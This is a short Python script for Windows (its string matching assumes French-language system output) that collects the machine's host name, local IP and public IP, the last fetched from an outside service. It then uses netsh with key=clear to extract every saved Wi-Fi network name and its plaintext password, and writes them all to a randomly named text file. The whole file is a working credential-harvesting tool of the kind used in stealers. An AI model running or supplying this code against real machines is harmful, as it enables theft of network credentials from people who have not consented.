
import uuid
import socket
from requests import get

encoding = input("------> Encoding :  ")

print()

unique_filename = str(uuid.uuid4())
#-----------------------------------------------------------------------------------

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('https://api.ipify.org').text


#------------------------------------------------------------------------------------

import subprocess


print()
print()

data = subprocess.check_output(['netsh' , 'wlan' , 'show' , 'profiles']).decode(encoding).split('\n')

target = [line.split(':')[1][1:-1] for line in data if "Profil Tous les utilisateurs" in line] 
target2 = [[element] for element in target]

i = 0


for element in target:
    
    result = subprocess.check_output(['netsh' , 'wlan' , 'show' , 'profile', element , 'key=clear']).decode(encoding).split('\n')
    result = [line.split(':')[1][1:-1] for line in result if 'Contenu de la clé' in line]
       
    for x in result:
        
        target2[target.index(element)].append(x)


print(target2)


file = open(str(unique_filename+".txt"),"w")

transfer2 = "Hostname :  " + str(hostname) + "\n"+ "Local ip :  " + str(local_ip)+"\n" + "Public ip :  " + str(public_ip)
file.write(transfer2 +"\n\n"+"---------------------------------------------------------------------------------------------------------------------"+"\n\n")

for wf in target2:
    try:
        file.write("Name  :  " + wf[0] + "        ||        " + "Password  :  "  + wf[1] )
    
        file.write("\n\n")

        file.write("----------------------------------------------------------------------------------------------------")

        file.write("\n\n")
    except:
        file.write("Name  :  " + wf[0] + "        ||        " + "Password  :  "  + "No Password" )
    
        file.write("\n\n")

        file.write("----------------------------------------------------------------------------------------------------")
        
        file.write("\n\n")

file.close()

       
    



    
